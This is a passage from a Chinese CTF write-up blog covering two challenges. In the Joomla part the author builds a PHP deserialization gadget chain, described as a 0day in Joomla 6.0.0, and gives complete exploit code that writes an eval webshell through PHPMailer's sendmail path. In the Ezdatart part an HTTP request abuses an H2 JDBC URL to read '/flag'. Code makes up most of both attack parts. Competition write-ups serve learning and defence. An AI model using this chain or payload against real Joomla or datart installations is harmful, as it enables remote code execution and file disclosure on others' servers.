+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="Joomla"><a href="#Joomla" class="headerlink" title="Joomla"></a>Joomla</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Joomla是世界上非常流行的软件包，它十分的安全，使用MVC结构组织代码，可扩展性非常的强大，被广泛的用于企业，政府，个人搭建web应用，目前全球范围内约2.8%（2014的统计数据）的网站是基于joomla搭建。在CMS全球市场份额占有约9%。现在来挖挖它最新版的反序列化吧！</span><br></pre></td></tr></table></figure>
+
+<p>让我们挖php反序列化链子（0day），最新版本6.0.0。</p>
+<p>我们首先寻找漏洞利用的点</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/11.png" class="" title="image-20251223210459326">
+
+<p>我们跟进到phpmailer.php。</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/31.png" class="" title="image-20251223210818627">
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/32.png" class="" title="image-20251223210836788">
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/33.png" class="" title="image-20251223211157238">
+
+<p>此处$Sendmail的值是我们可控的，而$body值则是函数传入值，那么我们这里可以实现文件写入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sendmail = sprintf(</span><br><span class="line">    &#x27;%s -oi -f %s -t&#x27;,          // 格式</span><br><span class="line">    escapeshellcmd(&quot;tee /var/www/html/shell.php --&quot;),  // 第一个%s</span><br><span class="line">    &quot;attacker@example.com&quot;      // 第二个%s</span><br><span class="line">);</span><br><span class="line">// 结果：tee /var/www/html/shell.php -- -oi -f attacker@example.com -t</span><br></pre></td></tr></table></figure>
+
+<p>然后我们对sendmailSend方法查找方法，看谁调用了他。</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/12.png" class="" title="image-20251223211423978">
+
+<p>只要$Mailer为sendmail或者qmail都能进入到sendmailSend方法。</p>
+<p>继续查找用法</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/13.png" class="" title="image-20251223211621452">
+
+<p>这里我们让presend返回true即可进入postSend方法。</p>
+<p>然后我们在send方法查找方法。但是我们啥都找不到。</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/14.png" class="" title="image-20251223212737555">
+
+<p>然后我们在此处找到了一个可以调用方法的地方。调用$listener的$event方法。接着看何处调用dispatcher</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/15.png" class="" title="image-20251223213929993">
+
+<p>databaseDriver的dispatchEvent方法调用了dispatch，先getDispatcher再调用它的dispatch。继续看何处调用dispatchEvent。</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/16.png" class="" title="image-20251223214057404">
+
+<p>databaseDriver的disconnect方法调用了它</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/17.png" class="" title="image-20251223214135123">
+
+<p>这里说明当<code>SqliteDriver</code>对象销毁时，会自动触发名为<code>&#39;onAfterDisconnect&#39;</code>的事件。</p>
+<p>然后在disconnect处查找用法</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/18.png" class="" title="image-20251226194007263">
+
+<p>找到入口点啦！但是DataBaseDriver是抽象类，我们找一下它的子类实现它：</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/19.png" class="" title="image-20251226194434312">
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/20.png" class="" title="image-20251226194459072">
+
+<p>一整条链子就完成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SqliteDriver#__destruct -&gt;</span><br><span class="line">	DatabaseDriver#disconnect -&gt;</span><br><span class="line">		DatabaseDriver#dispatchEvent -&gt;</span><br><span class="line">			Dispatcher#dispatch -&gt;</span><br><span class="line">				PHPMail#send -&gt;</span><br><span class="line">					PHPMail#postSend -&gt;</span><br><span class="line">						PHPMail#sendmailSend -&gt;</span><br><span class="line">							popen!!!</span><br></pre></td></tr></table></figure>
+
+<p>然后我们开始分析一下</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/21.png" class="" title="image-20251226202425854">
+
+<p>我们首先看看ConnectionEvent</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/22.png" class="" title="image-20251226202621682">
+
+<p>第一个传参是name，也就是onAfterDisconnect；第二个传参是一个driver（$this，也就是自己）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new ConnectionEvent(DatabaseEvents::POST_DISCONNECT, $this)</span><br><span class="line">// 等价于：</span><br><span class="line">new ConnectionEvent(&#x27;onAfterDisconnect&#x27;, $driver)</span><br></pre></td></tr></table></figure>
+
+<p>接着跟进到dispatchEvent方法，先调用getDispatcher获取dispatcher，然后调用dispatcher的dispatch方法，此处获取的dispatcher就要是如下dispatcher了：</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/23.png" class="" title="image-20251226202832920">
+
+<p>在dispatch方法中遍历listeners数组，并调用$listener的event，也就是遍历所有监听器并执行。</p>
+<p>这里我们让它变成调用PHPMail的send方法！</p>
+<p>$event-&gt;getName其实就是onAfterDisconnect，那么$listeners就可以设置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;onAfterDisconnect&#x27; =&gt; [[$phpmailer, &#x27;send&#x27;]]]</span><br></pre></td></tr></table></figure>
+
+<p>循环listeners的onAfterDisconnect，那么$listener就是<code>[[$phpmailer, &#39;send&#39;]]</code>，对应了<code>$phpmailer-&gt;send</code>，实现了调用！</p>
+<p>那我们继续往下看：</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/24.png" class="" title="image-20251226205211367">
+
+<p>我们需要让preSend为true。继续跟进</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/25.png" class="" title="image-20251226205502899">
+
+<p>这里我们让$Mail为<code>sendmail</code>或者<code>qmail</code>都可以。</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/26.png" class="" title="image-20251226205814429">
+
+<p>然后构造命令即可。</p>
+<p>构造exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Joomla</span>\<span class="title class_">Database</span>\<span class="title class_">Sqlite</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">SqliteDriver</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">dispatcher</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dispatcher</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;dispatcher = <span class="variable">$dispatcher</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Joomla</span>\<span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">listeners</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$listeners</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;listeners = <span class="variable">$listeners</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PHPMailer</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">Mailer</span>=&#x27;<span class="title class_">qmail</span>&#x27;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Sender</span>=<span class="string">&#x27;MeteorKai@qq.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Sendmail</span>=<span class="string">&#x27;tee /var/www/html/tmp/shell.php --&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CharSet</span> = <span class="string">&#x27;iso-8859-1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Body</span>=<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$From</span> = <span class="string">&#x27;MeteorKai@example.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$AllowEmpty</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cc</span> = [[<span class="string">&#x27;MeteorKai@qq.com&#x27;</span>,<span class="string">&#x27;MeteorKai&#x27;</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">phpmailer</span> = <span class="title class_">new</span> \<span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">\Joomla\Event\Dispatcher</span>([<span class="string">&#x27;onAfterDisconnect&#x27;</span> =&gt; [[<span class="variable">$phpmailer</span>,<span class="string">&#x27;send&#x27;</span>]]]);</span><br><span class="line">    <span class="variable">$driver</span> = <span class="keyword">new</span> <span class="title class_">\Joomla\Database\Sqlite\SqliteDriver</span>(<span class="variable">$dispatcher</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$driver</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是发现会报错？？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught TypeError: Joomla\Database\Pdo\PdoDriver::__construct(): Argument #1 ($options) must be of type array, null given, called in /var/www/html/libraries/vendor/joomla/database/src/Pdo/PdoDriver.php on line 783 and defined in /var/www/html/libraries/vendor/joomla/database/src/Pdo/PdoDriver.php:71 Stack trace: #0 /var/www/html/libraries/vendor/joomla/database/src/Pdo/PdoDriver.php(783): Joomla\Database\Pdo\PdoDriver-&gt;__construct(NULL) #1 [internal function]: Joomla\Database\Pdo\PdoDriver-&gt;__wakeup() #2 /var/www/html/unser.php(6): unserialize(&#x27;O:35:&quot;Joomla\\Da...&#x27;) #3 &#123;main&#125; thrown in /var/www/html/libraries/vendor/joomla/database/src/Pdo/PdoDriver.php on line 71</span><br></pre></td></tr></table></figure>
+
+<p>问了一下AI，说错误发生在wakeup中，回归源码看看：</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/27.png" class="" title="image-20251226213255253">
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/28.png" class="" title="image-20251226213233879">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Joomla</span>\<span class="title class_">Database</span>\<span class="title class_">Sqlite</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">SqliteDriver</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">dispatcher</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>= [<span class="string">&#x27;driver&#x27;</span>=&gt;<span class="string">&#x27;MeteorKai&#x27;</span>];<span class="comment">//这里是host什么的都可以</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dispatcher</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;dispatcher = <span class="variable">$dispatcher</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Joomla</span>\<span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">listeners</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$listeners</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;listeners = <span class="variable">$listeners</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PHPMailer</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">Mailer</span>=&#x27;<span class="title class_">qmail</span>&#x27;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Sender</span>=<span class="string">&#x27;MeteorKai@qq.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Sendmail</span>=<span class="string">&#x27;tee /var/www/html/tmp/shell1.php --&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CharSet</span> = <span class="string">&#x27;iso-8859-1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Body</span>=<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$From</span> = <span class="string">&#x27;MeteorKai@example.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$AllowEmpty</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cc</span> = [[<span class="string">&#x27;MeteorKai@qq.com&#x27;</span>,<span class="string">&#x27;MeteorKai&#x27;</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">phpmailer</span> = <span class="title class_">new</span> \<span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">\Joomla\Event\Dispatcher</span>([<span class="string">&#x27;onAfterDisconnect&#x27;</span> =&gt; [[<span class="variable">$phpmailer</span>,<span class="string">&#x27;send&#x27;</span>]]]);</span><br><span class="line">    <span class="variable">$driver</span> = <span class="keyword">new</span> <span class="title class_">\Joomla\Database\Sqlite\SqliteDriver</span>(<span class="variable">$dispatcher</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$driver</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/29.png" class="" title="image-20251226213605669">
+
+
+
+
+
+<h3 id="Ezdatart"><a href="#Ezdatart" class="headerlink" title="Ezdatart"></a>Ezdatart</h3><p>一个开源的datart项目，版本为<code>1.0.0-rc.3</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/data-provider/test HTTP/1.1</span><br><span class="line">Host: 172.31.17.18:8080</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Referer: http://172.31.17.18:8080/organizations/f0868537b23e42b183ad8a101cf503b7/sources/6bcd1c797fb84755b47bf0fddeef95f2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: AUTHORIZATION_TOKEN=Bearer%20eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJwYXNzd29yZCI6LTE0NDQwODMyMiwiZXhwIjoxNzY0MjUwMTA0fQ.A6MrsP5DBLFbVlXsl_vGOqy32EhuLJEFWdXqNYJz7Cc</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJwYXNzd29yZCI6LTE0NDQwODMyMiwiZXhwIjoxNzY0MjUwMTA0fQ.A6MrsP5DBLFbVlXsl_vGOqy32EhuLJEFWdXqNYJz7Cc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line">Content-Length: 344</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;jdbc-data-provider&quot;,&quot;type&quot;:&quot;JDBC&quot;,&quot;properties&quot;:&#123;&quot;dbType&quot;:&quot;H2&quot;,&quot;url&quot;:&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;/flag&#x27;&quot;,&quot;user&quot;:null,&quot;password&quot;:&quot;&quot;,&quot;driverClass&quot;:&quot;org.h2.Driver&quot;,&quot;serverAggregate&quot;:false,&quot;enableSpecialSQL&quot;:false,&quot;enableSyncSchemas&quot;:true,&quot;syncInterval&quot;:&quot;60&quot;,&quot;properties&quot;:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/30.png" class="" title="image-20251127212001993">
+
+<p>打JDBC，让他读取<code>/flag</code>的内容并执行SQL文件，我们直接读flag他会报错把flag的内容直接报出来。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%91%E7%BD%91%E4%BA%92%E8%81%94%E8%B5%9B%E9%81%93"><span class="toc-number">1.</span> <span class="toc-text">云网互联赛道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-1"><span class="toc-number">1.1.</span> <span class="toc-text">Web-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-2-1"><span class="toc-number">1.2.</span> <span class="toc-text">Web-2.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-2-2"><span class="toc-number">1.3.</span> <span class="toc-text">Web-2.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-3-1"><span class="toc-number">1.4.</span> <span class="toc-text">Web-3.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-3-2"><span class="toc-number">1.5.</span> <span class="toc-text">Web-3.2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">2.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Joomla"><span class="toc-number">2.1.</span> <span class="toc-text">Joomla</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezdatart"><span class="toc-number">2.2.</span> <span class="toc-text">Ezdatart</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&text=2025强网拟态决赛 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&is_video=false&description=2025强网拟态决赛 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025强网拟态决赛 wp&body=Check out this article: http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&name=2025强网拟态决赛 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&t=2025强网拟态决赛 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        Meteor_Kai
+        <br>
+        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">Home</a></li><!--
+                --><!--
+                --><li><a href="/about/">About me</a></li><!--
+                --><!--
+                --><li><a href="/archives/">Writing</a></li><!--
+                --><!--
